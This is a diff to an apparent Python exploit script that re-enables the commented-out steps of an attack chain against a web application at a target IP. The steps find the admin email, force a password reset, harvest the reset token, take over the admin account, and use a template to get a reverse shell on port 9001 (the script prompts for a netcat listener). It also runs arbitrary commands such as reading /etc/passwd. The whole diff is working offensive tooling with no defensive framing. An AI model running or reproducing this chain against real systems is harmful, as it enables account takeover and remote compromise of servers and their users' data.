@@ -366,16 +366,16 @@ def main():
 	admin_email = get_admin_user_email(ip)
 	print(f"Admin email {admin_email} found!")
 
-	# print("Sending password reset......")
-	# send_reset_password(ip, admin_email)
+	print("Sending password reset......")
+	send_reset_password(ip, admin_email)
 
-	# print("Searching for password reset token")
-	# token = get_password_reset_token(ip, admin_email)
-	# print(f"Sucessfully got reset token {token}")
+	print("Searching for password reset token")
+	token = get_password_reset_token(ip, admin_email)
+	print(f"Sucessfully got reset token {token}")
 
-	# print("Restting password")
-	# reset_password(ip, admin_email, token, new_password)
-	# print("Password reset succesfully!")
+	print("Restting password")
+	reset_password(ip, admin_email, token, new_password)
+	print("Password reset succesfully!")
 
 	print("Logging in now")
 	session = login(ip, admin_email, new_password)
@@ -384,12 +384,13 @@ def main():
 	print(f"Created new template named: {template_name}")
 
 	# Gets a reverse shell on port 9001
-	#get_shell(ip, session, admin_email, template_name)
+	print("Sending reverse shell, ensure you have netcat listener on port 9001")
+	get_shell(ip, session, admin_email, template_name)
 	
 	# Runs arbitrary command (using sys intermediary)
-	# cmd = "cat /etc/passwd"
-	# output = execute_command(ip, session, admin_email, template_name, cmd)
-	# print(output)
+	cmd = "cat /etc/passwd"
+	output = execute_command(ip, session, admin_email, template_name, cmd)
+	print(output)
 
 	# Arbitrary file run (using builtin functions)
 	cmd = "whoami"
